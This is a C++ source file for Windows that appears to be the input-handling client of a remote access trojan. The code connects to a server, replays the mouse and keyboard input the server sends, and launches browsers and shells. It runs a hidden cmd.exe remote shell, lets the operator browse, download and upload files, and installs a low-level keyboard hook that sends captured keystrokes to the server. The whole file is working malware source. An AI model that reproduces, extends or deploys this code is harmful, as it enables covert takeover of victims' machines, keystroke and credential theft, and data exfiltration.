#define WIN32_LEAN_AND_MEAN
#include "InputHandler.h"
#include "Network.h"

#include <Windows.h>
#include <shellapi.h>
#include <iostream>
#include <thread>
#include <vector>
#include <fstream>

constexpr UINT CMD_FULLSCREEN        = 101;           
constexpr UINT CMD_START_EXPLORER    = WM_USER + 1;    
constexpr UINT CMD_START_RUN         = WM_USER + 2;       
constexpr UINT CMD_START_CHROME      = WM_USER + 3;    
constexpr UINT CMD_START_EDGE        = WM_USER + 4;        
constexpr UINT CMD_START_BRAVE       = WM_USER + 5;    
constexpr UINT CMD_START_FIREFOX     = WM_USER + 6;    
constexpr UINT CMD_START_IEXPL       = WM_USER + 7;    
constexpr UINT CMD_START_POWERSHELL  = WM_USER + 8;    
constexpr UINT CMD_SHELL_OPEN        = 300;           
constexpr UINT CMD_SHELL_COMMAND     = 301;            
constexpr UINT CMD_FILE_LIST         = 310;            
constexpr UINT CMD_FILE_DOWNLOAD     = 311;            
constexpr UINT CMD_FILE_UPLOAD       = 312;            
constexpr UINT CMD_KEYLOGGER_START   = 320;            
constexpr UINT CMD_KEYLOGGER_STOP    = 321;           

static HANDLE g_hShellProcess    = NULL;
static HANDLE g_hShellThread     = NULL;
static HANDLE g_hShellStdInWrite = NULL;
static HANDLE g_hShellStdOutRead = NULL;

static bool   g_shellRunning     = false;
static bool   g_stopShellReader  = false;
static SOCKET g_shellSocket      = INVALID_SOCKET;

static HHOOK  g_hKeyHook         = NULL;
static bool   g_keyloggerActive  = false;
static SOCKET g_keySocket        = INVALID_SOCKET;

static void SendMouseInput(DWORD flags, LONG dx, LONG dy, DWORD mouseData)
{
    INPUT inp = {};
    inp.type        = INPUT_MOUSE;
    inp.mi.dx       = dx;
    inp.mi.dy       = dy;
    inp.mi.mouseData = mouseData;
    inp.mi.dwFlags  = flags;
    SendInput(1, &inp, sizeof(inp));
}

static void SendKeyboardInput(WORD vk, bool keyUp)
{
    INPUT inp = {};
    inp.type       = INPUT_KEYBOARD;
    inp.ki.wVk     = vk;
    if(keyUp) inp.ki.dwFlags |= KEYEVENTF_KEYUP;
    SendInput(1, &inp, sizeof(inp));
}

static void SimulateEvent(UINT msg, WPARAM wParam, LPARAM lParam)
{
    std::cout << "[SimulateEvent] msg=0x" << std::hex << msg
              << " wParam=0x" << wParam
              << " lParam=0x" << lParam
              << std::dec << std::endl;

    switch(msg)
    {
        case WM_MOUSEMOVE:
        {
            int x = LOWORD(lParam), y = HIWORD(lParam);
            int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
            LONG xx = (x * 65535) / sw, yy = (y * 65535) / sh;
            SendMouseInput(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE, xx, yy, 0);
            break;
        }
        case WM_LBUTTONDOWN: SendMouseInput(MOUSEEVENTF_LEFTDOWN,0,0,0); break;
        case WM_LBUTTONUP:   SendMouseInput(MOUSEEVENTF_LEFTUP,0,0,0);   break;
        case WM_RBUTTONDOWN: SendMouseInput(MOUSEEVENTF_RIGHTDOWN,0,0,0);break;
        case WM_RBUTTONUP:   SendMouseInput(MOUSEEVENTF_RIGHTUP,0,0,0);  break;
        case WM_MOUSEWHEEL:
        {
            short delta = HIWORD(wParam);
            SendMouseInput(MOUSEEVENTF_WHEEL,0,0,(DWORD)delta);
            break;
        }

        case WM_KEYDOWN: SendKeyboardInput((WORD)wParam,false); break;
        case WM_KEYUP:   SendKeyboardInput((WORD)wParam,true);  break;
        case WM_CHAR:
            break;

        case WM_SYSCOMMAND:
        case WM_COMMAND:
        {
            UINT id = LOWORD(wParam);
            std::cout << "[Command] id=" << id << std::endl;

            auto launch = [&](const char* exe){
                ShellExecuteA(nullptr, "open", exe, nullptr, nullptr, SW_SHOWDEFAULT);
            };

            switch(id)
            {
                case CMD_START_EXPLORER:   launch("explorer.exe");   break;
                case CMD_START_RUN:        launch("cmd.exe");        break;
                case CMD_START_POWERSHELL: launch("powershell.exe"); break;
                case CMD_START_CHROME:     launch("chrome.exe");     break;
                case CMD_START_EDGE:       launch("msedge.exe");     break;
                case CMD_START_BRAVE:      launch("brave.exe");      break;
                case CMD_START_FIREFOX:    launch("firefox.exe");    break;
                case CMD_START_IEXPL:      launch("iexplore.exe");   break;
                case CMD_SHELL_OPEN:
                case CMD_SHELL_COMMAND:
                case CMD_FILE_LIST:
                case CMD_FILE_DOWNLOAD:
                case CMD_FILE_UPLOAD:
                case CMD_KEYLOGGER_START:
                case CMD_KEYLOGGER_STOP:
                    break;

                default:
                    std::cout << "[Warn] Unknown command id" << std::endl;
                    break;
            }
            break;
        }

        default:
            break;
    }
}

static HANDLE g_hShellReaderThread = NULL;

DWORD WINAPI ShellReaderThread(LPVOID)
{
    char buffer[512];
    while(!g_stopShellReader)
    {
        DWORD rd = 0;
        if(!ReadFile(g_hShellStdOutRead, buffer, sizeof(buffer)-1, &rd, NULL) || rd == 0)
        {
            Sleep(50);
            continue;
        }
        buffer[rd] = 0;
        SendPacket(g_shellSocket, OP_SHELL_OUTPUT, buffer, rd);
    }
    return 0;
}

bool StartShell(SOCKET s)
{
    SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };
    HANDLE hStdInRead = NULL, hStdOutWrite = NULL;

    if(!CreatePipe(&hStdInRead, &g_hShellStdInWrite, &sa, 0))   return false;
    if(!CreatePipe(&g_hShellStdOutRead, &hStdOutWrite, &sa, 0)) return false;
    SetHandleInformation(g_hShellStdInWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_hShellStdOutRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdInRead;
    si.hStdOutput  = hStdOutWrite;
    si.hStdError   = hStdOutWrite;

    PROCESS_INFORMATION pi{};
    if(!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        return false;

    CloseHandle(hStdInRead);
    CloseHandle(hStdOutWrite);

    g_hShellProcess   = pi.hProcess;
    g_hShellThread    = pi.hThread;
    g_shellRunning    = true;
    g_stopShellReader = false;
    g_shellSocket     = s;
    g_hShellReaderThread = CreateThread(NULL, 0, ShellReaderThread, NULL, 0, NULL);
    return true;
}

void StopShell()
{
    if(!g_shellRunning) return;
    g_stopShellReader = true;
    if(g_hShellReaderThread)
    {
        WaitForSingleObject(g_hShellReaderThread,2000);
        CloseHandle(g_hShellReaderThread);
        g_hShellReaderThread = NULL;
    }
    if(g_hShellProcess)   { TerminateProcess(g_hShellProcess,0); CloseHandle(g_hShellProcess);   g_hShellProcess   = NULL; }
    if(g_hShellThread)    { CloseHandle(g_hShellThread);                         g_hShellThread    = NULL; }
    if(g_hShellStdInWrite){ CloseHandle(g_hShellStdInWrite);                   g_hShellStdInWrite= NULL; }
    if(g_hShellStdOutRead){ CloseHandle(g_hShellStdOutRead);                   g_hShellStdOutRead= NULL; }
    g_shellSocket  = INVALID_SOCKET;
    g_shellRunning = false;
}

void WriteShellCmd(const std::string &cmd)
{
    if(!g_shellRunning || !g_hShellStdInWrite) return;
    DWORD written = 0;
    std::string c = cmd + "\r\n";
    WriteFile(g_hShellStdInWrite, c.data(), (DWORD)c.size(), &written, NULL);
}

static bool g_fileUploadActive = false;
static std::ofstream g_ofs;

static void HandleFileList(SOCKET s, const std::string &path)
{
    std::string result;
    WIN32_FIND_DATAA fdata;
    std::string mask = path + "\\*";

    HANDLE hFind = FindFirstFileA(mask.c_str(), &fdata);
    if(hFind == INVALID_HANDLE_VALUE)
    {
        result = "Cannot open dir: " + path;
        SendPacket(s, OP_FILE_LISTRES, result.data(), (int)result.size());
        return;
    }
    do
    {
        result += fdata.cFileName;
        if(fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            result += "\\";
        result += "\r\n";
    } while(FindNextFileA(hFind, &fdata));
    FindClose(hFind);

    SendPacket(s, OP_FILE_LISTRES, result.data(), (int)result.size());
}

static void HandleFileDownload(SOCKET s, const std::string &filename)
{
    std::ifstream ifs(filename, std::ios::binary);
    if(!ifs)
    {
        std::string err = "Cannot open file: " + filename;
        SendPacket(s, OP_FILE_DONE, err.data(), (int)err.size());
        return;
    }
    char buf[1024];
    while(ifs.read(buf, sizeof(buf)))
    {
        SendPacket(s, OP_FILE_DATA, buf, (int)ifs.gcount());
    }
    if(ifs.gcount()>0)
        SendPacket(s, OP_FILE_DATA, buf, (int)ifs.gcount());

    SendPacket(s, OP_FILE_DONE, nullptr, 0);
}

static void StartFileUpload(const std::string &fname)
{
    if(g_fileUploadActive) { g_ofs.close(); g_fileUploadActive = false; }
    g_ofs.open(fname, std::ios::binary);
    g_fileUploadActive = g_ofs.is_open();
}

static void HandleFileData(const char *data, int len)
{
    if(g_fileUploadActive && g_ofs) g_ofs.write(data, len);
}

static void FinishFileUpload(SOCKET)
{
    if(g_fileUploadActive) { g_ofs.close(); g_fileUploadActive = false; }
}

static std::string g_keyBuffer;
static bool        g_stopKeyThread = false;

LRESULT CALLBACK LLKeyProc(int code, WPARAM wParam, LPARAM lParam)
{
    if(code == HC_ACTION && g_keyloggerActive)
    {
        auto pk = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        if(wParam==WM_KEYDOWN||wParam==WM_SYSKEYDOWN)
        {
            char c=0;
            if(pk->vkCode>=0x30 && pk->vkCode<=0x5A)
            {
                c = (char)pk->vkCode;
                if(!(GetKeyState(VK_SHIFT)&0x8000)) c = tolower(c);
            }
            else if(pk->vkCode==VK_SPACE) c=' ';
            else if(pk->vkCode==VK_RETURN) c='\n';
            if(c) g_keyBuffer.push_back(c);
        }
    }
    return CallNextHookEx(g_hKeyHook, code, wParam, lParam);
}

DWORD WINAPI KeyloggerThread(LPVOID param)
{
    SOCKET s = (SOCKET)param;
    while(!g_stopKeyThread)
    {
        if(!g_keyloggerActive) { Sleep(500); continue; }
        std::string tmp;
        tmp.swap(g_keyBuffer);
        if(!tmp.empty())
            SendPacket(s, OP_KEY_DATA, tmp.data(), (int)tmp.size());
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI AdvancedInputThread(LPVOID lpParam)
{
    SOCKET s = (SOCKET)lpParam;
    PacketHeader ph{};
    std::vector<char> data;

    g_hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle(NULL),0);
    g_keyloggerActive = false;
    HANDLE hKeyThread = CreateThread(NULL,0, KeyloggerThread, (LPVOID)s,0,NULL);

    while(RecvPacket(s, ph, data))
    {
        std::string payload(data.begin(), data.end());

        switch(ph.opcode)
        {
            case OP_SHELL_START: StartShell(s);            break;
            case OP_SHELL_STOP:  StopShell();              break;
            case OP_SHELL_CMD:   WriteShellCmd(payload);   break;

            case OP_FILE_LIST:     HandleFileList(s,payload);    break;
            case OP_FILE_DOWNLOAD: HandleFileDownload(s,payload);break;
            case OP_FILE_UPLOAD:   StartFileUpload(payload);     break;
            case OP_FILE_DATA:     HandleFileData(data.data(),ph.dataSize); break;
            case OP_FILE_DONE:     FinishFileUpload(s); break;

            case OP_KEY_START: g_keyloggerActive = true;  break;
            case OP_KEY_STOP:  g_keyloggerActive = false; break;

            default:
                std::cerr << "[Adv] Unknown opcode=" << ph.opcode << std::endl;
                break;
        }
    }

    StopShell();
    g_stopKeyThread = true;
    WaitForSingleObject(hKeyThread,2000);
    CloseHandle(hKeyThread);
    UnhookWindowsHookEx(g_hKeyHook);
    return 0;
}

void InputThreadFunc(const std::string& serverIp, int port)
{
    SOCKET s = ConnectToServer(serverIp, port);
    if(s==INVALID_SOCKET) { std::cerr<<"[Input] connect failed\n";return; }

    if(!SendHandshake(s, Connection::input))
    { std::cerr<<"[Input] handshake failed\n"; closesocket(s); return; }

    int ack=0;
    if(RecvInt(s, ack)<=0)
    { std::cerr<<"[Input] no ack\n"; closesocket(s); return; }
    std::cout<<"[Input] Connected & acknowledged.\n";

    HANDLE hAdv = CreateThread(NULL,0,AdvancedInputThread,(LPVOID)s,0,NULL);
    if(hAdv) CloseHandle(hAdv);

    for(;;)
    {
        int msg,wP,lP;
        if(RecvInt(s,msg)<=0||RecvInt(s,wP)<=0||RecvInt(s,lP)<=0) break;
        SimulateEvent((UINT)msg,(WPARAM)wP,(LPARAM)lP);
    }

    std::cout<<"[Input] Disconnected.\n";
    closesocket(s);
}
